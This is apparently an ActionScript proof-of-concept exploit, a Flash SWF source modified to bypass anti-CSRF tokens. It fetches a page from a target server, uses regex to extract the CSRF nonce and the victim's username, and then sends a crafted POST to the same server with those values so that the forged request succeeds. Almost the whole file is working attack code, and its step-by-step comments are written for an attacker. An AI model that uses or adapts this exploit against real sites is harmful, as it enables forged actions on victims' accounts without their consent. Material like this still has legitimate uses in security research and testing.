// Original POC Author: Gursev Singh Kalra (gursev.kalra@foundstone.com)
// Modified to bypass antiCSRF tokens: Seth Art (sethsec@gmail.com)
// ExtractCSRFnonceAndSecondItemThenMakePOSTrequest.as

package {
 import flash.display.Sprite;
 import flash.events.*;
 import flash.net.URLRequestMethod;
 import flash.net.URLRequest;
 import flash.net.URLLoader;

 public class ExtractCSRFnonceAndSecondItemThenMakePOSTrequest extends Sprite {
  public function ExtractCSRFnonceAndSecondItemThenMakePOSTrequest() {
   // Target URL from where the data is to be retrieved
   var readFrom:String = "http://vulnerable-server/page-with-nonce-and-other-item.html";
   var readRequest:URLRequest = new URLRequest(readFrom);
   var getLoader:URLLoader = new URLLoader();
   getLoader.addEventListener(Event.COMPLETE, eventHandler);
   try {
    getLoader.load(readRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }


  private function eventHandler(event:Event):void {
   // This assigns the reponse from the first 
   // request to "reponse". The antiCSRF token is
   // somwhere in this reponse
   var response:String = event.target.data;

   // This line looks for the line in the response 
   // that contains the CSRF token.  Here we are matching
   // all lines that have the string "submit-", and
   // grabbing the text that comes after it.
   var CSRF:Array = response.match(/submit-.*/);

   // This line extracts the value of the CSRF token, 
   // and assigns it to "token"
   var token:String = CSRF[0].split("\"")[0];


   // This section finds the second piece of information.
   // In this example, I am extracting a string from the title
   
   // This line matches all lines with "Preferences"
   var TITLE:Array = response.match(/Preferences.*/);
   // This splits the lines based on spaces, and assigns
   // the data that is in the third chuck delimited by space
   // In my example, this is the username.
   var USER:String = TITLE[0].split("\ ")[2];


   // These next three lines define the portions of the 
   // POST request that are static and known in advance
   // by the attacker
   var prefix:String = "url="
   var middle:String = "&param1=a&param2=b&param3=c&"
   var suffix:String = "=Save"
   
   // This line takes the USER varable above, and concatinates it with the 
   // middle portion of the POST request
   var part1:String = prefix.concat(USER,middle)

   // These three lines define where the second request will be sent.
   // This request will be a POST request, and the POST body will
   // execute CSRF
   var sendTo:String = "http://vulnerable-server/send-crafted-POST-data-here"
   var sendRequest:URLRequest = new URLRequest(sendTo);
   sendRequest.method = URLRequestMethod.POST;

   // This next line sets the data portion of the POST request 
   // It combines what has already been combined so far (part1)
   // with the Nonce and the suffix
   sendRequest.data = part1.concat(token,suffix)
   
   // Time to create the URLLoader object and send the 
   // POST request containing the CSRF token
   var sendLoader:URLLoader = new URLLoader();
   try {
    sendLoader.load(sendRequest);
   } catch (error:Error) {
    trace("Error loading URL: " + error);
   }
  }
 }
}
